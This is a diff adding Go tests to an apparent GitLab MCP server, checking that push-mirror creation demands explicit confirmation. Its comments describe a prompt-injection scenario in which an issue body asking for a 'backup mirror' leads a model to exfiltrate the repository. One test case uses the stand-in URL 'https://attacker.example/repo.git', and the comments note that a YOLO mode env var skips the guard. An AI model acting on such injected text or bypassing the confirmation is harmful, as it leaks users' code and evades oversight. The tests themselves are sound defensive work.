@@ -4,6 +4,8 @@ package projectmirrors
 import (
 	"context"
 	"net/http"
+	"strings"
+	"sync/atomic"
 	"testing"
 
 	"github.com/modelcontextprotocol/go-sdk/mcp"
@@ -92,6 +94,167 @@ func TestActionSpecs_ErrorPaths(t *testing.T) {
 			}
 		})
 	}
+}
+
+// TestActionSpecs_MirrorAddRequiresConfirmation pins the classification that
+// turns the confirmation guard on for push-mirror creation.
+//
+// Creating a push mirror hands the host named in url a continuous copy of the
+// whole repository, and the url is a tool parameter, so a model that has read
+// an issue body asking for a "backup mirror" could exfiltrate the repository
+// with one unconfirmed call. Every surface runs the guard off Route.Destructive
+// and nothing else, so this classification is the whole fix; that it reaches a
+// caller is [TestCatalogSurface_MirrorAddWithoutConfirm_IsRefused].
+func TestActionSpecs_MirrorAddRequiresConfirmation(t *testing.T) {
+	spec := projectMirrorSpecsByTool(t, ActionSpecs(testutil.NewTestClient(t, projectMirrorActionHandler())))["gitlab_add_project_mirror"]
+
+	t.Run("the spec and its route agree the action is destructive", func(t *testing.T) {
+		if !spec.Destructive || !spec.Route.Destructive {
+			t.Errorf("spec.Destructive = %t, Route.Destructive = %t, want both true", spec.Destructive, spec.Route.Destructive)
+		}
+		if err := spec.Validate(); err != nil {
+			t.Errorf("spec.Validate() error: %v", err)
+		}
+	})
+
+	t.Run("repeating the call is not advertised as safe", func(t *testing.T) {
+		// Two calls with one url leave two mirror rows, so idempotentHint must
+		// stay false: it is the bit that tells a model a retry costs nothing.
+		if spec.Idempotent {
+			t.Error("spec.Idempotent = true, want false: creating a mirror twice creates two mirrors")
+		}
+	})
+
+	t.Run("the served schema offers confirm", func(t *testing.T) {
+		schema := toolutil.MetaActionSchema(spec.Route)
+		properties, _ := schema["properties"].(map[string]any)
+		if _, ok := properties["confirm"]; !ok {
+			t.Errorf("served input schema has no confirm property, properties = %v", properties)
+		}
+		if destructive, _ := schema["x_destructive"].(bool); !destructive {
+			t.Error("served input schema does not carry x_destructive")
+		}
+	})
+}
+
+// TestCatalogSurface_MirrorAddWithoutConfirm_IsRefused drives push-mirror
+// creation over a real MCP session and asserts the guard both refuses an
+// unconfirmed call and lets a confirmed one through.
+//
+// The client registers no elicitation handler, which is the shape that matters:
+// it cannot be asked, so the guard has to refuse rather than proceed silently.
+// The request counter is what makes the refusal meaningful, since a refusal
+// that still issued the POST would have exfiltrated the repository already.
+//
+// The env var is pinned because the guard's first branch is YOLO mode: an
+// inherited GITLAB_MCP_YOLO_MODE or AUTOPILOT would skip confirmation and leave
+// the refusal row failing on a machine that has it set.
+func TestCatalogSurface_MirrorAddWithoutConfirm_IsRefused(t *testing.T) {
+	t.Setenv("GITLAB_MCP_YOLO_MODE", "false")
+
+	var created atomic.Int64
+	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Method == http.MethodPost && r.URL.Path == pathMirrors {
+			created.Add(1)
+			testutil.RespondJSON(w, http.StatusCreated, mirrorJSON)
+			return
+		}
+		http.NotFound(w, r)
+	})
+	spec := projectMirrorSpecsByTool(t, ActionSpecs(testutil.NewTestClient(t, handler)))["gitlab_add_project_mirror"]
+
+	server := mcp.NewServer(&mcp.Implementation{Name: "test", Version: "0.0.1"}, nil)
+	toolutil.RegisterSurfaceToolFromSpec(server, spec, toolutil.SurfaceToolRegisterOptions{
+		Description: "Test push mirror creation confirmation.",
+		Icons:       toolutil.IconInfra,
+	})
+	session := connectProjectMirrorSession(t, server)
+
+	callCases := []struct {
+		name        string
+		args        map[string]any
+		wantRefused bool
+	}{
+		{
+			name:        "without confirm the call never reaches GitLab",
+			args:        map[string]any{"project_id": testProjectID, "url": "https://attacker.example/repo.git"},
+			wantRefused: true,
+		},
+		{
+			name:        "with confirm true the mirror is created",
+			args:        map[string]any{"project_id": testProjectID, "url": "https://example.com/repo.git", "confirm": true},
+			wantRefused: false,
+		},
+	}
+	for _, tc := range callCases {
+		t.Run(tc.name, func(t *testing.T) {
+			before := created.Load()
+
+			result, err := session.CallTool(t.Context(), &mcp.CallToolParams{Name: "gitlab_add_project_mirror", Arguments: tc.args})
+			if err != nil {
+				t.Fatalf("CallTool error: %v", err)
+			}
+
+			assertMirrorAddOutcome(t, result, created.Load()-before, tc.wantRefused)
+		})
+	}
+}
+
+// assertMirrorAddOutcome checks one push-mirror creation call: a refusal must
+// name confirm=true and must have sent no request, and an accepted call must
+// have sent exactly one.
+func assertMirrorAddOutcome(t *testing.T, result *mcp.CallToolResult, sent int64, wantRefused bool) {
+	t.Helper()
+	if wantRefused {
+		if !result.IsError {
+			t.Errorf("IsError = false, want a refusal for a call carrying no confirm")
+		}
+		if text := resultText(result); !strings.Contains(text, "confirm=true") {
+			t.Errorf("refusal text = %q, want it to name confirm=true", text)
+		}
+		if sent != 0 {
+			t.Errorf("POST requests = %d, want 0: an unconfirmed call must not reach GitLab", sent)
+		}
+		return
+	}
+	if result.IsError {
+		t.Errorf("IsError = true for a confirmed call, text = %q", resultText(result))
+	}
+	if sent != 1 {
+		t.Errorf("POST requests = %d, want 1", sent)
+	}
+}
+
+// connectProjectMirrorSession connects an in-memory client with no elicitation
+// handler to server and returns the client session, closed on cleanup.
+func connectProjectMirrorSession(t *testing.T, server *mcp.Server) *mcp.ClientSession {
+	t.Helper()
+	st, ct := mcp.NewInMemoryTransports()
+	serverSession, err := server.Connect(t.Context(), st, nil)
+	if err != nil {
+		t.Fatalf("server connect: %v", err)
+	}
+	session, err := mcp.NewClient(&mcp.Implementation{Name: "c", Version: "0.0.1"}, nil).Connect(t.Context(), ct, nil)
+	if err != nil {
+		t.Fatalf("client connect: %v", err)
+	}
+	t.Cleanup(func() {
+		session.Close()
+		_ = serverSession.Wait()
+	})
+	return session
+}
+
+// resultText joins the text content of a tool result, so an assertion can read
+// what the caller was told.
+func resultText(result *mcp.CallToolResult) string {
+	var parts []string
+	for _, content := range result.Content {
+		if text, ok := content.(*mcp.TextContent); ok {
+			parts = append(parts, text.Text)
+		}
+	}
+	return strings.Join(parts, "\n")
 }
 
 // TestCatalogSurface_DeleteConfirmDeclined covers destructive confirmation when the user declines.
